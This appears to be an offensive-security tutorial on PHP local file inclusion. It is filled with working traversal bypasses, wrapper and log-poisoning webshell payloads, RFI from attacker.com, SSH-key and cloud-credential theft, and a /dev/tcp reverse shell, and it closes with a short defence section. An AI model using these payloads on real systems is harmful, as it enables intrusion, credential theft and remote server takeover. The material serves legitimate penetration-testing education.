LFI — Local File Inclusion from First Principles

2026-06-04 · 7 min read · Notes · lfi web php path-traversal rce red-team notes

How local file inclusion works, every PHP wrapper, log poisoning, /proc tricks, path traversal filters, LFI-to-RCE paths, sensitive files on Linux and Windows, and a full exploitation methodology.

Local File Inclusion is one of those vulnerabilities that looks simple — you swap a filename in a URL — but the exploitation depth is enormous. From reading /etc/passwd all the way to a full shell, the attack surface is determined by the server's configuration, the application's context, and how creative you get with what you feed the include function.

This guide covers LFI from the mechanics up through every reliable code-execution path, with the filter bypasses and file targets that matter in real engagements.

01 What Is File Inclusion?

File inclusion vulnerabilities arise when a web application takes user-controlled input and passes it to a function that reads or executes a file. In PHP — still the most common context — those functions are:

FunctionExecutes PHP?Output
`include()`YesOutputs content, warns on failure
`include_once()`YesSame, but only once
`require()`YesFatal error on failure
`require_once()`YesSame, but only once
`file_get_contents()`NoReturns content as string
`fopen()` / `readfile()`NoReads bytes, no execution

The critical distinction: include() and require() execute PHP code inside the included file. file_get_contents() just returns bytes. This distinction determines whether you can reach RCE.

Classic vulnerable pattern:

php 
<?php
$page = $_GET['page'];
include($page . '.php');
?>

The developer intended: ?page=about → includes about.php. You supply: ?page=../../../../etc/passwd → includes the passwd file. The .php extension appended by code is a complication we'll deal with.

02 Path Traversal Basics

../ is the traversal sequence — each ../ moves one directory up toward the filesystem root. Stack enough of them and you escape the web root.

text 
Document root: /var/www/html/
Vulnerable include: include('/var/www/html/' . $page . '.php')

Payload: ../../../../etc/passwd
Result:  include('/var/www/html/../../../../etc/passwd.php')
         resolves to: include('/etc/passwd.php')

If there's no extension append, it resolves cleanly to /etc/passwd.

How many ../ do you need? You can't go above / — extra traversals are silently ignored. Start with ../../../../../ (6 deep). The worst case is a web root sitting at /var/www/html/app/module/pages/ (4 levels deep) so 6 always gets you to root.

Linux vs Windows:
- Linux: ../ and ..%2F
- Windows: ..\, ..\/, ..%2F, ..%5C all work. Windows is also case-insensitive for paths.

URL encoding traversal:

BypassEncoding
`../``%2e%2e%2f`
`../``%2e%2e/`
`../``..%2f`
`..\``%2e%2e%5c`
Double URL encode`%252e%252e%252f`

03 Filter Bypass Techniques

Most real applications run some kind of sanitisation. Here's how developers typically implement it and how each can be bypassed.

Stripping `../`

php 
$page = str_replace('../', '', $_GET['page']);

This replaces ../ with nothing — but only once per pass. If you double it up, the stripping leaves a new ../:

text 
....//  →  strip ../  →  ../
....//....//  →  ../../

Use ....// instead of ../ everywhere.

Extension Appending (no null byte in PHP ≥ 5.3)

Old PHP (≤ 5.3) allowed a null byte %00 to terminate string processing:

text 
?page=../../../../etc/passwd%00
→ include('/etc/passwd') + [ignored]

This does not work in modern PHP (5.3.4+ fixed). If you encounter it in CTFs it signals a very old target.

Fixed Extension — Using PHP Wrappers Instead

When the code appends .php and you can't use null bytes, PHP stream wrappers bypass the issue entirely. See the PHP Wrappers section below.

Path Length Truncation (very old PHP)

PHP on some old configurations truncated filenames at 4096 characters:

text 
?page=../../../../etc/passwd/./././././[... 4096 chars total ...]

The .php gets cut off. Largely theoretical on modern systems.

Double Encoding

Some WAFs or filters URL-decode once then check. Double-encode:

text 
%252e%252e%252f  → (decode once) → %2e%2e%2f → (app decodes) → ../

Absolute Path When No Prefix Is Added

If the application just does include($_GET['page']) with no path prefix, try absolute paths:

text 
?page=/etc/passwd
?page=/var/www/html/config.php

04 PHP Stream Wrappers

PHP's stream wrapper system is the most powerful LFI escalation primitive. Wrappers are URI-scheme prefixes that change how PHP reads a "file". They work with include(), file_get_contents(), and most file-related functions.

`php://filter` — Read Source Code Without Execution

This is the most important wrapper for LFI. It lets you read PHP source code as base64 instead of having it executed:

text 
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=../config/database.php

The output is a base64 blob. Decode it locally:

bash 
echo 'PD9waHAgJGRiX3Bhc3N3b3...' | base64 -d > config.php
cat config.php

This reveals hardcoded credentials, API keys, database passwords, and the full application logic — all gold for an engagement.

Reading arbitrary files (no extension issue):

text 
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/resource=/etc/shadow

`php://input` — Execute Arbitrary PHP

When allow_url_include=On (often off by default but misconfigured), you can POST raw PHP code and have it executed:

bash 
curl -X POST 'http://target/index.php?page=php://input' \
  --data '<?php system($_GET["cmd"]); ?>'

Then: ?page=php://input&cmd=id

Or in one request:

bash 
curl -X POST 'http://target/index.php?page=php://input&cmd=id' \
  --data '<?php system($_GET["cmd"]); ?>'

`data://` — Inline Data as PHP

Also requires allow_url_include=On:

text 
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

Base64 version avoids issues with special characters in the URL.

`expect://` — Direct Command Execution

Requires the expect PHP extension (rare but occasionally installed):

text 
?page=expect://id
?page=expect://whoami

`zip://` and `phar://` — Include Files From Archives

If you can upload a file (even if the server renames it), you can package PHP inside a ZIP or PHAR and include it:

bash 
# Create a PHP webshell inside a zip
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
# Upload shell.zip to the server (e.g., as an avatar)

Then:

text 
?page=zip:///var/www/html/uploads/shell.zip#shell
?page=phar:///var/www/html/uploads/shell.zip/shell.php

The #shell refers to the file inside the archive (without .php extension).

`file://` — Explicit File Read

text 
?page=file:///etc/passwd
?page=file:///C:/Windows/win.ini

Useful when the application strips ../ but not the file:// scheme.

05 LFI to RCE: Log Poisoning

Log poisoning is the classic LFI-to-RCE technique when wrappers are unavailable. The idea: inject PHP code into a log file, then include the log file.

Apache Access Log

Step 1 — Inject PHP into the User-Agent:

bash 
curl -A '<?php system($_GET["cmd"]); ?>' http://target/

Apache logs every request including the User-Agent. The line in /var/log/apache2/access.log now contains raw PHP code.

Step 2 — Include the log:

text 
?page=../../../../var/log/apache2/access.log&cmd=id

Apache executes the PHP when it includes the file. Output appears inline with the log content.

Common Apache/Nginx log locations:

text 
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log          (CentOS/RHEL)
/var/log/httpd/error_log
/proc/self/fd/1                    (stdout — sometimes works)
/proc/self/fd/2                    (stderr)

SSH Auth Log

SSH logs authentication attempts including usernames. The username field is logged — inject PHP there:

bash 
ssh '<?php system($_GET["cmd"]); ?>'@target
# (connection will fail — that's fine, just need the log entry)

Then: ?page=../../../../var/log/auth.log&cmd=id

Auth log locations:

text 
/var/log/auth.log        (Debian/Ubuntu)
/var/log/secure          (CentOS/RHEL)

`/proc/self/environ`

The /proc/self/environ pseudo-file contains the environment variables of the current process (Apache/PHP). The HTTP_USER_AGENT and other request headers appear here.

bash 
curl -A '<?php system($_GET["cmd"]); ?>' 'http://target/?page=../../../../proc/self/environ&cmd=id'

This works when /proc/self/environ is readable by the web server process (common on misconfigured servers).

Email/Mail Logs

If the server has a mail service and you can send email to a local user:

text 
/var/mail/www-data
/var/spool/mail/www-data

Send a PHP payload as the mail body, then include the mail spool file.

Session Files

PHP stores session data in files. If you can control session variable values, inject PHP there:

text 
/var/lib/php/sessions/sess_[SESSIONID]
/tmp/sess_[SESSIONID]
/var/lib/php5/sessions/sess_[SESSIONID]

If the application stores user-supplied data in a session variable:

php 
$_SESSION['username'] = $_GET['user'];  // vulnerable

Set your username to <?php system($_GET["cmd"]); ?>, find your session ID from the PHPSESSID cookie, then include /var/lib/php/sessions/sess_YOURSESSID.

06 LFI to RCE: Other Paths

Upload + Include

The most reliable RCE path when file upload exists anywhere on the application:

  1. Find a file upload endpoint (avatar, profile photo, document upload, etc.)
  2. Upload a PHP webshell disguised with a permitted extension: shell.jpg containing <?php system($_GET['cmd']); ?>
  3. Determine the upload path (often disclosed in the response, HTML, or via directory listing)
  4. Include it: ?page=../../../../var/www/html/uploads/shell.jpg

The extension doesn't matter to include() — it executes PHP regardless.

Temp File Race (PHP + `/tmp`)

PHP stores uploaded files temporarily in /tmp/phpXXXXXX during the request. In a multipart file upload, you can:
1. Upload a file containing PHP
2. Simultaneously include /tmp/phpXXXXXX during the upload window

This is a race condition and unreliable, but tools like phpggc automate it. Mostly CTF-relevant.

Pearcmd (Docker + PHP CLI)

A more modern technique abusing pearcmd.php (installed with PHP CLI in many Docker images):

text 
?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?php system($_GET['cmd'])?>+/tmp/shell.php

Creates /tmp/shell.php, then include it. Detailed in HackTricks — relevant for Dockerised PHP apps.

phpinfo() + Race Condition

If phpinfo() is exposed, it reveals the exact path of uploaded temp files in real time. Automation:
1. Script sends a multipart upload in a loop
2. Second thread reads phpinfo() to get the temp path
3. Third thread immediately includes the temp path

Tools: phpinfolfi.py (InsomniaSec). Reliable when phpinfo() is accessible.

07 Remote File Inclusion (RFI)

RFI is when the include function fetches a file from a remote URL. It requires allow_url_include=On (off by default since PHP 5.2) and allow_url_fopen=On.

text 
?page=http://attacker.com/shell.php
?page=http://attacker.com/shell.txt

The .txt extension works just as well — PHP executes the response body as PHP regardless of the remote file extension.

Setup:

bash 
# Host shell on your attacker machine
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

Then: ?page=http://YOUR_IP/shell.php&cmd=id

Why it's rare in modern environments:
- allow_url_include is disabled by default
- WAFs typically block outbound HTTP from web server processes
- PHP 7+ changed defaults aggressively

If you're testing an old PHP app (5.x era) or a CTF box, always try RFI — it's the easiest path to RCE when it works.

08 Sensitive Files — Linux

When you have LFI and can't reach RCE immediately, reading sensitive files is your primary objective. These are the targets that matter:

Credentials & Auth

text 
/etc/passwd                    — user list, home dirs, shells
/etc/shadow                    — hashed passwords (needs root read)
/etc/group                     — group memberships
/home/USER/.ssh/id_rsa         — SSH private key
/home/USER/.ssh/authorized_keys
/root/.ssh/id_rsa
/home/USER/.bash_history       — command history (goldmine)
/root/.bash_history
/home/USER/.mysql_history
/home/USER/.psql_history

Application Config

text 
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php    — WordPress DB creds
/var/www/html/configuration.php  — Joomla
/var/www/html/config/database.php  — Laravel
/etc/phpmyadmin/config.inc.php
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf

Web Server Config

text 
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf  — virtual host paths
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf

System / Kernel Info

text 
/proc/version                  — kernel version and compiler info
/proc/cmdline                  — kernel boot params (sometimes creds)
/proc/self/environ             — current process env vars (HTTP headers here)
/proc/self/cmdline             — exact command line of current process
/proc/self/cwd                 — symlink to working dir (resolve with readlink)
/proc/self/fd/[N]              — file descriptors (fd/0=stdin, fd/1=stdout)
/proc/net/tcp                  — open TCP connections (hex encoded)
/proc/net/arp                  — ARP table (internal network mapping)
/etc/os-release                — distro info
/etc/hostname
/etc/hosts
/etc/resolv.conf               — DNS servers
/etc/crontab
/var/spool/cron/crontabs/root

Reading `/proc/net/tcp`

This file lists all TCP connections in hex. Column 2 is local address:port, column 3 is remote. Port 80 in hex is 0050.

text 
 sl  local_address rem_address   st
  0: 0100007F:1F91 00000000:0000 0A   ← 127.0.0.1:8081 listening

Reverse the byte order of each group and convert to decimal to get actual IP:port. This reveals internal services not visible from outside.

SSH Keys — The Big Win

If you find an SSH private key:

bash 
curl -s 'http://target/?page=../../../../home/john/.ssh/id_rsa' > john_id_rsa
chmod 600 john_id_rsa
ssh -i john_id_rsa john@target

If the key is passphrase-protected:

bash 
ssh2john john_id_rsa > john.hash
john --wordlist=/usr/share/wordlists/rockyou.txt john.hash

10 Fuzzing for LFI

Manual traversal is slow. Automate it with ffuf and a wordlist.

Basic ffuf fuzz

bash 
ffuf -u 'http://target/index.php?page=FUZZ' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fw 0 -mc 200

With traversal prefix

bash 
ffuf -u 'http://target/index.php?page=FUZZ' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -b 'PHPSESSID=abcd1234' \
  -H 'User-Agent: Mozilla/5.0' \
  -mc 200 -fw 0

SecLists LFI wordlists

text 
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-interest.txt

LFImap

lfimap automates wrapper testing, RCE checking, and log poisoning:

bash 
pip3 install lfimap
lfimap -U 'http://target/index.php?page=test' --lfi --rfi --rce

Burp Suite Intruder

For authenticated applications, use Burp Intruder with a Sniper attack on the file parameter using the same SecLists wordlists. Filter by response length deviation from baseline.

11 Full Exploitation Workflow

Step 1 — Confirm the vulnerability

bash 
curl -s 'http://target/index.php?page=../../../../etc/passwd'
# Look for: root:x:0:0:root

Step 2 — Enumerate the environment

bash 
# Kernel and OS
curl -s 'http://target/?page=../../../../proc/version'
curl -s 'http://target/?page=../../../../etc/os-release'

# Running user
curl -s 'http://target/?page=../../../../proc/self/environ'

# Internal services
curl -s 'http://target/?page=../../../../proc/net/tcp'

# Web root (often disclosed by error or proc/self/cwd)
curl -s 'http://target/?page=../../../../proc/self/cmdline' | tr '\0' ' '

Step 3 — Read sensitive files

bash 
# Application config first
curl -s 'http://target/?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
curl -s 'http://target/?page=php://filter/convert.base64-encode/resource=../.env' | base64 -d

# SSH keys
for user in $(curl -s 'http://target/?page=../../../../etc/passwd' | cut -d: -f1); do
  echo "[*] Trying $user"
  curl -s "http://target/?page=../../../../home/$user/.ssh/id_rsa"
done

Step 4 — Escalate to RCE

bash 
# Try wrappers first (no prereqs)
curl -s 'http://target/?page=php://filter/convert.base64-encode/resource=/etc/passwd'

# If allow_url_include=On:
curl -X POST 'http://target/?page=php://input&cmd=id' --data '<?php system($_GET["cmd"]); ?>'

# Log poisoning
curl -A '<?php system($_GET["cmd"]); ?>' 'http://target/'
curl -s 'http://target/?page=../../../../var/log/apache2/access.log&cmd=id'

Step 5 — Reverse shell

bash 
# URL-encode the reverse shell command
curl -s 'http://target/?page=../../../../var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2FYOUR_IP%2F4444+0%3E%261%27'

# Listener
nc -lvnp 4444

12 LFI in Other Languages

LFI-class vulnerabilities exist outside PHP wherever user input controls a file path.

Python (Flask/Django)

python 
# Vulnerable
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(filename)  # no sanitisation

Exploit: ?file=../../../../etc/passwd

send_file() won't execute Python, but you can read any file the process can access.

Java (Spring/Servlet)

java 
// Vulnerable
String file = request.getParameter("page");
new FileInputStream("/var/www/" + file);

Java path traversal works identically. ../ sequences work even on Windows with Spring.

Node.js

javascript 
// Vulnerable
app.get('/file', (req, res) => {
  fs.readFile('./public/' + req.query.name, (err, data) => {
    res.send(data);
  });
});

?name=../../../../etc/passwd — identical traversal.

Key difference: These languages don't execute included files as code (no direct LFI→RCE via wrappers). Your goal is information disclosure: config files, .env, /proc, AWS metadata at 169.254.169.254.

13 Cloud Metadata via LFI (SSRF Adjacent)

If the vulnerable application runs on AWS, GCP, or Azure, and the LFI allows fetching URLs (RFI path or SSRF), the cloud metadata endpoint is a critical target.

AWS IMDSv1:

text 
?page=http://169.254.169.254/latest/meta-data/
?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

Returns: AccessKeyId, SecretAccessKey, Token — temporary AWS credentials. Use them with aws-cli to enumerate/exfiltrate S3, EC2, etc.

GCP:

text 
?page=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Azure:

text 
?page=http://169.254.169.254/metadata/instance?api-version=2021-02-01

This is only reachable if allow_url_fopen=On AND allow_url_include=On, or via a server-side request from a framework. Pure path traversal LFI won't reach network endpoints.

14 Detection & Defence

For defenders — what to look for in logs:

text 
../  in URL parameters
%2e%2e  URL encoded traversal
php://  stream wrapper prefix
file://  scheme prefix
/etc/passwd  or other sensitive paths in parameters
data://  base64 payloads

Grep log files:

bash 
grep -E '(\.\./|%2e%2e|php://|file://|/etc/passwd|/etc/shadow)' /var/log/apache2/access.log

Hardening:

ControlHow
Disable dangerous PHP settings`allow_url_include=Off`, `allow_url_fopen=Off` in `php.ini`
Use a whitelistOnly allow known filenames, not arbitrary paths
`realpath()` + prefix checkResolve the real path then verify it starts with the expected directory
`open_basedir`Restrict PHP file access to specific directories
Run web server as low-privilege userLimits what files are readable even if LFI exists
Disable phpinfo()Removes temp file path disclosure
Remove unnecessary PHP extensions`expect`, `zip`, `phar` wrappers are often unneeded

Safe code pattern:

php 
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed)) {
    die('Invalid page');
}
include($page . '.php');

Whitelist input — never trust path components from the user.
